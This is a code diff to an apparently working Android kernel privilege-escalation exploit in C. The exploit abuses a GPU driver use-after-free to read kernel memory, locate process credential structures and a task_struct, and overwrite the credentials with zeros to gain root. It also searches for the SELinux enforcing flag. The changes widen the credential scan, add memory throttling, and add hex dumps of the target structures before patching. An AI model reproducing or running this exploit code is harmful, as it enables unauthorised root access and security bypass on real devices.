@@ -100,6 +100,7 @@ static void flush_icache(void *addr, size_t len)
 static int gpu_read_task_struct(int fd, uint64_t task_va, uint8_t *buffer, size_t size);
 static int gpu_write_task_virt(int fd, uint64_t dst_va, uint8_t *buffer, size_t size);
 static int gpu_read_u32(int fd, uint64_t src_va, uint32_t *value);
+static void hex_dump_internal(const char *desc, uint64_t addr, uint8_t *data, size_t size);
 
 static uint64_t find_selinux_enforcing_via_kbase(int fd, uint64_t kbase) {
     if (kbase == 0) return 0;
@@ -1201,26 +1202,36 @@ static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
 static int mass_patch_creds(int fd, uint32_t target_uid) {
     fprintf(stderr, "[PARENT] --- STARTING MASS CRED PATCH (Target UID: %u) ---\n", target_uid);
     int patch_count = 0;
-    int max_patches = 200; // Even more conservative for ROG 5S
+    int max_patches = 300; 
     uint8_t *page = malloc(PAGE_SIZE);
     
     // Scan all pages in the UAF range
     for (uint64_t va = UAF_START; va < UAF_START + UAF_SIZE; va += PAGE_SIZE) {
+        // Stability check: RAM usage during mass patch
+        if (patch_count % 100 == 0) {
+            double ram = get_ram_usage_percentage();
+            if (ram > 90.0) {
+                fprintf(stderr, "[PARENT] Mass patch throttling: RAM at %.1f%%. Resting...\n", ram);
+                usleep(500000);
+            }
+        }
+
         if (gpu_read_task_struct(fd, va, page, PAGE_SIZE) == 0) {
             for (int off = 0; off < PAGE_SIZE - 64; off += 8) {
                 uint32_t usage = *(uint32_t *)(page + off);
                 uint32_t ruid = *(uint32_t *)(page + off + 4);
                 
                 // Refined CRED pattern: usage > 0, UID == target_uid
-                if (usage >= 1 && usage <= 255 && ruid == target_uid) {
+                if (usage >= 1 && usage <= 500 && ruid == target_uid) {
                     if (ruid == 0) continue; 
 
                     patch_count++;
                     if (patch_count > max_patches) break;
 
-                    if (patch_count % 50 == 0) {
-                        fprintf(stderr, "[PARENT] Patched %d structures...\n", patch_count);
-                        usleep(50000); // More delay
+                    // Silent mode: only log every 100
+                    if (patch_count % 100 == 0) {
+                        fprintf(stderr, "[PARENT] Mass patching in progress: %d structures done.\n", patch_count);
+                        usleep(20000); 
                     }
                     
                     uint8_t zero_creds[32] = {0};
@@ -1282,6 +1293,13 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
     // 3. Patch specific process credentials (most reliable)
     if (cred_ptr != 0) {
         fprintf(stderr, "[PARENT] Patching target process CRED at 0x%lx...\n", (unsigned long)cred_ptr);
+        
+        // Detailed Info Request
+        uint8_t cred_dump[64];
+        if (gpu_read_task_struct(fd, cred_ptr, cred_dump, 64) == 0) {
+            hex_dump_internal("TARGET CRED DUMP (BEFORE)", cred_ptr, cred_dump, 64);
+        }
+        
         patch_cred_via_gpu(fd, cred_ptr, 0);
     }
 
@@ -1778,13 +1796,19 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                         } else {
                             fprintf(stderr, "    [!] Warning: Found CRED at 0x%lx has usage 0. This is likely a false positive.\n", 
                                     (unsigned long)found_cred_ptr);
-                            found_cred_ptr = 0; // Invalidate so dynamic search or fallback continues
+                            found_cred_ptr = 0; 
                         }
                     }
                 }
 
                 // RECORD TARGET INFO AND EXIT SCAN (Cleanup will happen in main)
                 fprintf(stderr, "\n    [!] TARGET LOCATED (PID %d). Preparing for cleanup and patch...\n", found_pid);
+                
+                // Detailed Info: Dump task_struct around marker
+                uint8_t task_dump[256];
+                if (gpu_read_task_struct(fd, task_start_va + OFFSET_COMM - 128, task_dump, 256) == 0) {
+                    hex_dump_internal("TASK_STRUCT AROUND COMM", task_start_va + OFFSET_COMM - 128, task_dump, 256);
+                }
                 
                 marker_found = 1;
                 *(uint64_t *)&gbuf[GBUF_TASK_VA] = task_start_va;
